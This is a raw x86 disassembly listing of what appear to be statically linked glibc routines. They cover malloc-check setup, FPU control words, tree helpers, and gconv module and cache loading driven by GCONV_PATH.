cmp eax, 0xfe
ja 0x80562ac
mov edx, dword [var_10h]
cmp ebx, edx
je 0x80562ac
cmp esi, 1
ja 0x8056280
movzx ecx, byte [edx]
test cl, cl
je 0x8056280
cmp cl, 0x2e
jne 0x80562ac
mov ecx, edi
shl eax, cl
or dword [var_14h], eax
cmp byte [edx], 0
je 0x8056298
inc esi
sub edi, 8
lea ebx, [edx + 1]
cmp esi, 2
jbe 0x8056242
mov eax, dword [var_14h]
test eax, eax
mov eax, dword [var_14h]
cmove eax, dword [0x80aac6c]
mov dword [0x80aac6c], eax
mov eax, dword [0x80aac34]
test eax, eax
je 0x80562c2
mov dword [esp], eax
call fcn.08053400
mov dword [0x80aac0c], eax
mov ebx, dword [0x80aac3c]
test ebx, ebx
je 0x80562f5
mov esi, dword [0x80aac5c]
xor edx, edx
cmp edx, esi
jae 0x80562f5
mov eax, ebx
lea esi, [esi]
mov ecx, edx
shl ecx, 5
cmp dword [eax], 0x6474e551
je 0x80562fd
inc edx
add eax, 0x20
cmp edx, esi
jb 0x80562e0
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + ecx + 0x18]
mov dword [0x80a95c8], eax
jmp 0x80562f5
mov dword [esp], str.MALLOC_CHECK_
call fcn.08063640
jmp 0x805620b
mov ecx, dword [0x80a95f4]
jmp 0x80561d4
push ebp
mov ebp, esp
sub esp, 8
fnstcw word [ebp - 2]
mov ecx, dword [arg_8h]
movzx eax, word [var_2h]
mov edx, ecx
and ax, 0xf0c0
and dx, 0xf3f
or eax, edx
mov word [var_2h], ax
fldcw word [ebp - 2]
test byte [0x80aa84b], 2
je 0x8062c48
movzx edx, cx
stmxcsr dword [ebp - 8]
mov eax, dword [var_8h]
mov ecx, edx
and edx, 0x3d
and ecx, 0xc00
shl edx, 7
shl ecx, 3
and eax, 0xffff817f
or ecx, edx
or eax, ecx
mov dword [var_8h], eax
ldmxcsr dword [ebp - 8]
leave
ret
mov ecx, dword [arg_4h]
mov edx, dword [arg_8h]
mov al, byte [ecx]
cmp al, byte [edx]
jne 0x8076e67
inc ecx
inc edx
test al, al
jne 0x8076e58
xor eax, eax
ret
mov eax, 1
mov ecx, 0xffffffff
cmovb eax, ecx
ret
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
test edx, edx
je 0x807a308
mov eax, dword [edx]
test eax, eax
je 0x807a306
mov ebx, eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_4h], eax
call esi
mov ecx, eax
mov eax, ebx
test ecx, ecx
je 0x807a308
lea eax, [ebx + 4]
lea edx, [ebx + 8]
test ecx, ecx
cmovns eax, edx
mov eax, dword [eax]
test eax, eax
mov ebx, eax
jne 0x807a2e0
xor eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov dword [var_20h], 0
mov dword [var_1ch], 0
mov edi, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_14h], 0
mov dword [var_18h], 0
test edi, edi
je 0x807a2b4
mov eax, dword [edi]
test eax, eax
je 0x807a1d5
and byte [eax + 0xc], 0xfe
mov eax, dword [edi]
test eax, eax
mov esi, edi
je 0x807a25a
nop
lea esi, [esi]
mov ebx, dword [edi]
mov eax, dword [ebx]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [arg_10h]
mov dword [var_18h], eax
mov ecx, dword [var_18h]
mov eax, ebx
test ecx, ecx
je 0x807a2b4
mov eax, dword [var_20h]
mov dword [var_sp_14h], 0
mov dword [esp], edi
lea esi, [ebx + 4]
mov dword [var_sp_10h], eax
mov eax, dword [var_1ch]
mov dword [var_ch], eax
mov eax, dword [var_14h]
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.0807a080
mov edx, dword [var_18h]
lea eax, [ebx + 8]
test edx, edx
cmovns esi, eax
mov eax, dword [esi]
test eax, eax
je 0x807a25a
mov eax, dword [var_10h]
mov dword [var_10h], edi
mov edi, esi
mov dword [var_14h], eax
mov eax, dword [var_1ch]
mov dword [var_20h], eax
mov eax, dword [var_18h]
mov dword [var_1ch], eax
jmp 0x807a1e0
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807a285
mov dword [esi], eax
mov dword [ebx + 4], 0
mov dword [ebx + 8], 0
mov eax, dword [arg_8h]
or byte [ebx + 0xc], 1
mov dword [ebx], eax
cmp esi, edi
je 0x807a2b2
mov eax, dword [var_1ch]
mov dword [var_sp_14h], 1
mov dword [var_4h], edi
mov dword [esp], esi
mov dword [var_sp_10h], eax
mov eax, dword [var_18h]
mov dword [var_ch], eax
mov eax, dword [var_10h]
mov dword [var_8h], eax
call fcn.0807a080
mov eax, ebx
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [0x80aa898], eax
mov eax, dword [0x80aa894]
mov dword [var_4h], 0x805d330
mov dword [esp], eax
call fcn.0807a780
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a799
test edx, edx
je 0x807a799
xor ecx, ecx
leave
jmp 0x807a6e0
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, eax
mov eax, dword [eax + 4]
mov esi, edx
test eax, eax
jne 0x807a7de
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a7d5
mov eax, dword [ebx]
mov dword [esp], eax
call esi
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov edx, esi
call fcn.0807a7a0
jmp 0x807a7be
call fcn.0807a7a0
jmp 0x807a7b7
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a800
leave
jmp fcn.0807a7a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac60]
test eax, eax
jne 0x8083531
leave
ret
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
jmp 0x808352f
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
xor esi, esi
push ebx
xor ebx, ebx
sub esp, 0x14
mov dword [var_10h], edx
mov eax, dword [ebx + 0x80a9820]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8057df3
inc esi
add ebx, 0x1c
cmp esi, 0xb
jbe 0x8057dd2
jmp 0x8057e67
cmp esi, 0xb
ja 0x8057e67
lea edx, [esi*8]
mov ecx, dword [var_10h_2]
sub edx, esi
shl edx, 2
mov eax, dword [edx + 0x80a9824]
mov dword [ecx + 0x1c], 0
mov dword [ecx + 0x20], 0
mov dword [ecx], 0
mov dword [ecx + 4], 0
mov dword [ecx + 0x14], eax
mov eax, dword [edx + 0x80a9828]
mov dword [ecx + 0x18], eax
mov eax, dword [edx + 0x80a982c]
mov dword [ecx + 0x24], eax
mov eax, dword [edx + 0x80a9830]
mov dword [ecx + 0x28], eax
mov eax, dword [edx + 0x80a9834]
mov dword [ecx + 0x2c], eax
mov eax, dword [edx + 0x80a9838]
mov dword [ecx + 0x34], 0
mov dword [ecx + 0x30], eax
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], str.__gconv_get_builtin_trans
mov dword [var_8h], 0x47
mov dword [var_4h], str.gconv_builtin.c
mov dword [esp], str.cnt___sizeof__map____sizeof__map_0__
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0xffffffff
mov ebp, esp
movzx edx, byte [var_8h]
leave
movzx ecx, dl
test dl, dl
cmovns eax, ecx
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_ch], eax
mov dword [var_8h], fcn.0805d180
mov dword [var_4h], 0x80aa894
lea eax, [var_ch]
mov dword [var_bp_8h], ebx
mov dword [var_bp_4h], esi
mov dword [esp], eax
call fcn.0807a2c0
test eax, eax
je 0x805d28b
mov ebx, dword [eax]
test ebx, ebx
je 0x805d210
mov eax, dword [ebx + 4]
cmp eax, 0xfffffffe
jge 0x805d272
mov ecx, dword [ebx + 8]
test ecx, ecx
jne 0x805d301
mov dword [var_4h], 1
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.080836e0
test eax, eax
mov dword [ebx + 8], eax
jne 0x805d21a
xor ebx, ebx
lea esi, [esi]
mov eax, ebx
mov esi, dword [var_4h_3]
mov ebx, dword [var_bp_8h]
leave
ret
mov dword [var_4h], 0x80a4b8c
mov eax, dword [ebx + 8]
mov dword [esp], eax
call fcn.08083750
test eax, eax
mov dword [ebx + 0xc], eax
jne 0x805d23d
mov eax, ebx
call fcn.0805d3c0
jmp 0x805d208
mov dword [var_4h], str.gconv_init
mov eax, dword [ebx + 8]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 0x10], eax
mov dword [var_4h], str.gconv_end
mov eax, dword [ebx + 8]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 4], 1
mov dword [ebx + 0x14], eax
jmp 0x805d210
mov edx, dword [ebx + 8]
test edx, edx
je 0x805d210
lea edx, [eax + 1]
mov eax, 1
test edx, edx
cmovg eax, edx
mov dword [ebx + 4], eax
jmp 0x805d210
mov eax, dword [var_ch]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
add eax, 0x19
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x805d210
lea edx, [eax + 0x18]
mov dword [var_8h], esi
mov eax, dword [var_ch]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053770
mov dword [ebx + 8], 0
mov dword [ebx], eax
mov dword [ebx + 4], 0xfffffffd
mov dword [esp], ebx
mov dword [var_8h], fcn.0805d180
mov dword [var_4h], 0x80aa894
call fcn.0807a190
test eax, eax
jne 0x805d1d4
mov dword [esp], ebx
call fcn.08051180
jmp 0x805d208
mov dword [var_sp_ch], str.__gconv_find_shlib
mov dword [var_8h], 0x74
mov dword [var_4h], str.gconv_dl.c
mov dword [esp], str.found__handle____void__0_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov edx, dword [var_8h]
mov eax, dword [var_4h]
mov dword [ebp - 4], ebx
test edx, edx
mov ebx, dword [eax]
je 0x805d34f
cmp edx, 3
je 0x805d34f
mov ebx, dword [var_4h_3]
leave
ret
cmp ebx, dword [0x80aa898]
je 0x805d385
mov edx, dword [ebx + 4]
lea eax, [edx + 2]
cmp eax, 2
ja 0x805d34a
lea eax, [edx - 1]
cmp eax, 0xfffffffe
mov dword [ebx + 4], eax
jge 0x805d34a
mov eax, dword [ebx + 8]
test eax, eax
je 0x805d34a
mov dword [esp], eax
call fcn.08083790
mov dword [ebx + 8], 0
jmp 0x805d34a
mov eax, dword [ebx + 4]
test eax, eax
jle 0x805d392
dec eax
mov dword [ebx + 4], eax
jmp 0x805d34a
mov dword [esp + 0xc], 0x8093dcf
mov dword [var_8h_2], 0xa6
mov dword [var_4h_2], str.gconv_dl.c
mov dword [esp], str.obj__counter___0
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x8076eba
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_14h], eax
mov dword [var_8h], fcn.08056540
mov dword [var_4h], 0x80aa85c
lea eax, [var_14h]
mov dword [var_bp_4h], ebx
mov dword [var_10h], edx
mov ebx, ecx
mov dword [var_ch], 0
mov dword [var_bp_8h], 0
mov dword [esp], eax
call fcn.0807a2c0
mov edx, 1
test eax, eax
je 0x80565d4
mov edx, dword [eax]
mov eax, dword [edx + 8]
mov edx, dword [edx + 0xc]
mov dword [ebx], eax
mov eax, dword [arg_8h]
mov dword [eax], edx
xor edx, edx
mov ebx, dword [var_bp_4h]
mov eax, edx
leave
ret 4
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x14
mov eax, dword [eax + 0x14]
mov dword [var_1ch], 3
mov dword [var_10h], ecx
mov dword [var_14h], 0
test eax, eax
je 0x805670d
mov eax, dword [eax + 0x14]
inc dword [var_14h]
test eax, eax
jne 0x8056703
mov ebx, dword [var_14h]
mov eax, ebx
shl eax, 4
sub eax, ebx
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x80568bf
mov edx, dword [var_14h]
mov eax, dword [arg_ch]
mov dword [var_1ch], 0
mov dword [var_18h], edi
mov dword [eax], edx
dec edx
test ebx, ebx
mov dword [var_14h], edx
je 0x80567ce
mov eax, edx
shl eax, 4
sub eax, edx
lea ebx, [eax*4]
mov ecx, dword [var_14h]
test ecx, ecx
je 0x80568af
mov edx, dword [var_18h]
mov eax, dword [edx + 0x14]
mov eax, dword [eax]
mov dword [esi + ebx + 0xc], eax
mov edx, dword [arg_ch]
mov edi, ebx
mov eax, dword [var_14h]
inc eax
cmp eax, dword [edx]
je 0x805689d
mov eax, dword [esi + ebx + 0x48]
mov edx, dword [var_18h]
mov dword [esi + edi + 0x10], eax
mov dword [esi + ebx + 8], 1
mov dword [esi + ebx + 0x38], 0
mov eax, dword [edx + 0x10]
mov eax, dword [eax + 0x10]
cmp byte [eax], 0x2f
je 0x8056837
lea edx, [ebx + esi]
call fcn.08057dc0
mov eax, dword [var_18h]
sub ebx, 0x3c
mov eax, dword [eax + 0x14]
mov dword [var_18h], eax
mov eax, dword [var_14h]
dec dword [var_14h]
test eax, eax
jne 0x8056758
xor eax, eax
test eax, eax
jne 0x80567e0
mov edx, dword [arg_8h]
mov dword [edx], esi
mov eax, dword [var_1ch]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret 8
mov edx, dword [arg_ch]
inc dword [var_14h]
mov eax, dword [var_14h]
cmp eax, dword [edx]
jae 0x805680d
shl eax, 4
sub eax, dword [var_14h]
lea ebx, [esi + eax*4]
mov eax, ebx
add ebx, 0x3c
call fcn.08056690
mov edx, dword [arg_ch]
inc dword [var_14h]
mov eax, dword [var_14h]
cmp eax, dword [edx]
jb 0x80567f6
mov dword [esp], esi
call fcn.08051180
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [edx], 0
mov dword [eax], 0
mov edx, dword [var_1ch]
test edx, edx
jne 0x80567d3
mov dword [var_1ch], 1
jmp 0x80567d3
call fcn.0805d1a0
test eax, eax
mov edx, eax
je 0x80567e0
mov dword [esi + ebx], eax
mov ecx, dword [edx + 0x10]
mov dword [esi + ebx + 0x18], 0
mov eax, dword [eax]
test ecx, ecx
mov dword [esi + ebx + 0x1c], ecx
mov dword [esi + ebx + 4], eax
mov eax, dword [edx + 0xc]
mov dword [esi + ebx + 0x14], eax
mov eax, dword [edx + 0x14]
mov dword [esi + ebx + 0x20], eax
je 0x80567b2
mov dword [esp], ecx
call fcn.08083520
lea eax, [ebx + esi]
mov dword [esp], eax
call dword [esi + ebx + 0x1c]
test eax, eax
mov dword [var_1ch], eax
je 0x80567b2
dec dword [var_14h]
mov dword [esi + ebx - 0x1c], 0
jmp 0x80567e0
mov edx, dword [var_18h]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076e80
jmp 0x8056784
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08076e80
jmp 0x805676b
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [eax], 0
mov dword [edx], 0
jmp 0x80567d3
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [var_10h], eax
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08053400
lea edi, [eax + 1]
lea eax, [edi + esi + 0x10]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8056673
mov edx, dword [var_10h]
lea eax, [eax + 0x10]
mov dword [var_8h], esi
mov dword [ebx], eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov edx, dword [var_14h]
mov dword [var_8h], edi
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [ebx + 4], eax
mov dword [var_8h], fcn.08056540
mov dword [var_4h], 0x80aa85c
mov eax, dword [var_18h]
mov dword [ebx + 8], eax
mov eax, dword [arg_8h]
mov dword [ebx + 0xc], eax
call fcn.0807a190
test eax, eax
je 0x8056680
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret 4
lea esi, [esi]
mov dword [esp], ebx
call fcn.08051180
jmp 0x8056673
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov esi, edx
push ebx
dec esi
sub esp, 0xc
test edx, edx
mov dword [var_14h], 0
mov dword [var_10h], edx
je 0x805691b
lea esi, [esi]
mov eax, esi
shl eax, 4
sub eax, esi
lea ebx, [edi + eax*4]
mov eax, dword [ebx + 8]
inc eax
mov dword [ebx + 8], eax
dec eax
je 0x8056926
mov eax, esi
dec esi
test eax, eax
jne 0x8056900
mov eax, dword [var_14h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebx + 4]
test eax, eax
jne 0x8056944
mov eax, dword [ebx + 0x1c]
test eax, eax
je 0x8056914
mov dword [esp], eax
call fcn.08083520
mov dword [esp], ebx
call dword [ebx + 0x1c]
jmp 0x8056914
call fcn.0805d1a0
test eax, eax
mov edx, eax
mov dword [ebx], eax
je 0x805696c
mov eax, dword [eax + 0xc]
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], eax
mov eax, dword [edx + 0x10]
mov dword [ebx + 0x1c], eax
mov eax, dword [edx + 0x14]
mov dword [ebx + 0x20], eax
jmp 0x805692d
dec dword [ebx + 8]
inc esi
cmp esi, dword [var_10h]
jae 0x805698f
mov eax, esi
shl eax, 4
sub eax, esi
lea ebx, [edi + eax*4]
mov eax, ebx
inc esi
add ebx, 0x3c
call fcn.08056690
cmp esi, dword [var_10h]
jb 0x805697f
mov dword [var_14h], 1
jmp 0x805691b
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, edx
mov ebx, eax
mov edi, ecx
mov edx, dword [0x80aa888]
test edx, edx
je 0x805cd8c
lea edx, [var_10h]
call fcn.0805cb70
test eax, eax
je 0x805cd76
mov dword [var_sp_4h], esi
mov dword [esp], ebx
call fcn.08076e50
mov dword [edi], eax
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea edx, [var_14h]
mov eax, esi
call fcn.0805cb70
test eax, eax
jne 0x805cd5b
mov eax, dword [var_10h]
sub eax, dword [var_14h]
jmp 0x805cd67
mov eax, 0xffffffff
jmp 0x805cd6b
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_8h]
mov dword [var_8h], fcn.08056520
mov dword [var_4h], 0x80aaca0
mov dword [var_bp_8h], eax
lea eax, [var_bp_8h]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x8056eb2
mov eax, dword [eax]
mov edx, dword [eax + 4]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_10h], 0
mov dword [var_14h], 0
call fcn.08048b20
mov ebx, eax
mov eax, dword [eax]
mov dword [var_20h], eax
call fcn.0805c990
test eax, eax
jne 0x8057c89
mov edx, dword [var_20h]
mov dword [ebx], edx
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80aacac]
test eax, eax
je 0x8057da8
mov edx, dword [eax]
xor edi, edi
test edx, edx
je 0x8057d0b
mov dword [var_24h], edx
mov esi, dword [eax + edi*8 + 4]
inc edi
lea eax, [esi + 0x20]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_24h]
lea ebx, [var_1bh]
mov dword [var_8h], esi
and ebx, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.08053740
mov dword [esp], eax
mov dword [var_8h], 0xe
mov dword [var_4h], str.gconv_modules
call fcn.08053740
mov ecx, esi
lea eax, [var_14h]
lea edx, [var_10h]
mov dword [esp], eax
mov eax, ebx
mov dword [var_4h], edx
mov edx, dword [var_24h]
call fcn.08057780
mov eax, dword [0x80aacac]
sub esp, 8
mov edx, dword [eax + edi*8]
test edx, edx
mov dword [var_24h], edx
jne 0x8057ca1
xor edi, edi
lea esi, [var_1ch]
mov ebx, edi
mov dword [var_8h], fcn.08056520
mov dword [var_4h], 0x80aaca0
shl ebx, 5
mov dword [esp], esi
mov eax, dword [ebx + str.36_t_bp5_t_b]
mov dword [var_1ch], eax
call fcn.0807a2c0
test eax, eax
je 0x8057d99
inc edi
cmp edi, 0xb
jbe 0x8057d10
mov edi, 0x24
dec edi
mov ebx, dword [edi*4 + 0x80a9780]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov edx, dword [var_14h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08057210
test edi, edi
jne 0x8057d45
call fcn.08048b20
mov edx, dword [var_20h]
mov dword [eax], edx
jmp 0x8057c81
lea eax, [ebx + str.36_t_bp5_t_b]
xor edx, edx
call fcn.08057370
jmp 0x8057d3a
call fcn.08057930
mov eax, dword [0x80aacac]
jmp 0x8057c96
push ebp
mov ebp, esp
push esi
mov esi, 0xffffffff
push ebx
sub esp, 0x78
mov dword [esp], str.GCONV_PATH
call fcn.080631c0
test eax, eax
mov ecx, eax
mov dword [0x80aaca4], eax
jne 0x805ca08
mov ebx, str._usr_lib_gconv_gconv_modules.cache
mov edx, eax
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x805cb54
cmp ebx, 0xffffffff
mov esi, 0xffffffff
je 0x805ca08
lea eax, [var_68h]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_8h], eax
call fcn.08053dc0
test eax, eax
js 0x805c9fc
mov eax, dword [var_3ch]
cmp eax, 0xf
ja 0x805ca11
mov eax, 6
int 0x80
mov esi, 0xffffffff
add esp, 0x78
mov eax, esi
pop ebx
pop esi
leave
ret
mov dword [0x80aa88c], eax
mov dword [var_14h], 0
mov dword [var_10h], ebx
mov dword [var_ch], 1
mov dword [var_8h], 1
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov dword [0x80aa888], eax
inc eax
je 0x805cadf
mov eax, 6
int 0x80
mov edx, dword [0x80aa888]
cmp dword [edx], 0x20010324
jne 0x805caa2
movzx eax, word [edx + 4]
mov ecx, dword [0x80aa88c]
cmp eax, ecx
jae 0x805caa2
movzx ebx, word [edx + 6]
cmp ebx, ecx
jae 0x805caa2
movzx eax, word [edx + 8]
test ax, ax
je 0x805caa2
movzx eax, ax
lea eax, [ebx + eax*4]
cmp eax, ecx
ja 0x805caa2
movzx eax, word [edx + 0xa]
cmp eax, ecx
jae 0x805caa2
movzx eax, word [edx + 0xc]
xor esi, esi
cmp eax, ecx
jbe 0x805ca08
mov eax, dword [0x80aa890]
test eax, eax
je 0x805cacc
mov dword [esp], edx
call fcn.08051180
mov dword [0x80aa890], 0
mov dword [0x80aa888], 0
jmp 0x805ca03
mov eax, dword [0x80aa88c]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
jmp 0x805cabd
mov eax, dword [0x80aa88c]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [0x80aa888], eax
je 0x805c9fc
xor esi, esi
mov eax, dword [0x80aa88c]
sub eax, esi
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [0x80aa888]
add eax, esi
mov dword [var_4h], eax
call fcn.08053f70
cmp eax, 0xffffffff
je 0x805cb38
add esi, eax
mov eax, dword [0x80aa88c]
cmp esi, eax
jb 0x805cb00
mov dword [0x80aa890], 1
jmp 0x805ca4e
mov eax, dword [0x80aa888]
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa888], 0
jmp 0x805c9fc
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x805c9cf
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov dword [var_1ch], ecx
mov dword [var_18h], edx
mov dword [var_4h], 0x8093820
mov dword [esp], eax
call fcn.0804a250
test eax, eax
mov dword [var_20h], eax
mov dword [var_14h], 0
mov dword [var_10h], 0
je 0x805789d
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov edx, dword [var_20h]
test byte [edx], 0x10
jne 0x8057887
mov edi, dword [var_20h]
lea eax, [var_10h]
lea edx, [var_14h]
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], edx
mov dword [var_sp_ch], edi
call fcn.08075470
test eax, eax
mov edi, eax
js 0x8057887
mov ebx, dword [var_14h]
mov dword [var_4h], 0x23
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
mov esi, eax
je 0x8057917
mov byte [eax], 0
movzx edx, byte [ebx]
mov ecx, dword [0x80a99f4]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
je 0x8057840
inc ebx
movzx edx, byte [ebx]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8057832
cmp ebx, esi
je 0x805787b
test dl, dl
mov dword [var_24h], ebx
je 0x8057867
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8057867
inc ebx
movzx eax, byte [ebx]
test al, al
je 0x8057867
movsx eax, al
test byte [ecx + eax*2 + 1], 0x20
je 0x8057855
mov eax, ebx
sub eax, dword [var_24h]
cmp eax, 5
je 0x80578e9
mov eax, ebx
sub eax, dword [var_24h]
cmp eax, 6
je 0x80578a7
mov edi, dword [var_20h]
test byte [edi], 0x10
je 0x80577d4
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08051180
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08049dc0
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 8
mov esi, dword [var_24h]
mov eax, str.module
mov ecx, 6
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x805787b
mov eax, dword [0x80aa864]
mov edx, dword [arg_8h]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [esp], edx
inc eax
mov dword [0x80aa864], eax
mov edx, dword [var_18h]
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, ebx
call fcn.08057450
sub esp, 0xc
jmp 0x805787b
mov esi, dword [var_24h]
mov eax, str.alias
mov ecx, 5
cld
mov edi, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x8057871
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08057210
jmp 0x805787b
cmp byte [edi + ebx - 1], 0xa
jne 0x805781f
mov byte [edi + ebx - 1], 0
jmp 0x805781f
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov esi, dword [0x80a99f4]
mov ecx, dword [arg_8h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [esi + eax*2 + 1], 0x20
je 0x805723e
nop
inc ecx
movzx edx, byte [ecx]
movsx eax, dl
test byte [esi + eax*2 + 1], 0x20
jne 0x8057230
test dl, dl
mov dword [var_10h], ecx
mov edi, ecx
je 0x8057300
movsx ebx, dl
test byte [esi + ebx*2 + 1], 0x20
jne 0x805727e
mov edx, dword [0x80a99fc]
mov eax, edi
inc ecx
inc edi
mov edx, dword [edx + ebx*4]
mov byte [eax], dl
movzx edx, byte [ecx]
test dl, dl
je 0x8057300
mov eax, dword [0x80a99f4]
movsx ebx, dl
test byte [eax + ebx*2 + 1], 0x20
je 0x8057255
test dl, dl
je 0x8057300
inc ecx
mov byte [edi], 0
mov ebx, dword [0x80a99f4]
movzx edx, byte [ecx]
inc edi
mov esi, ecx
movsx eax, dl
test byte [ebx + eax*2 + 1], 0x20
je 0x80572ae
lea esi, [esi]
inc ecx
movzx edx, byte [ecx]
movsx eax, dl
test byte [ebx + eax*2 + 1], 0x20
jne 0x80572a0
test dl, dl
je 0x80572e7
movsx eax, dl
